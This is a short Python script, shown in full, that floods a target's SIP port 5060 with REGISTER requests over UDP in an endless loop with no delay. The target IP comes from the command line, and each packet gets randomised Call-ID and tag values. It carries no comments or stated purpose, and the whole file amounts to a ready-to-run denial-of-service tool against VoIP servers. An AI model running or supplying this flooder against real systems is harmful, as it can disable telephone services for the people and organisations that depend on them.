import socket, string, random, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
cseq = 1
UDP_IP = sys.argv[1]
UDP_PORT = 5060

while True:
    r = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    
    msg = "REGISTER sip:%s SIP/2.0\r\n" % (UDP_IP, )
    msg += "Via: SIP/2.0/UDP %s:46786;rport;branch=z9hG4bK-%s\r\n" % (UDP_IP, r, )
    msg += "Max-Forwards: 70\r\n"
    msg += "From: <sip:98647499@%s>;tag=%s\r\n" % (UDP_IP, r, )
    msg += "To: <sip:98647499@%s>\r\n" % (UDP_IP, )
    msg += "Call-ID: %s\r\n" % (r, )
    msg += "CSeq: %s REGISTER\r\n" % (cseq, )
    msg += "Contact: <sip:98647499@%s:46786;transport=udp>\r\n" % (UDP_IP, )
    msg += "Expires: 60\r\n"
    msg += "Content-Length: 0\r\n"
    msg += "\r\n" 

    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

    cseq += 1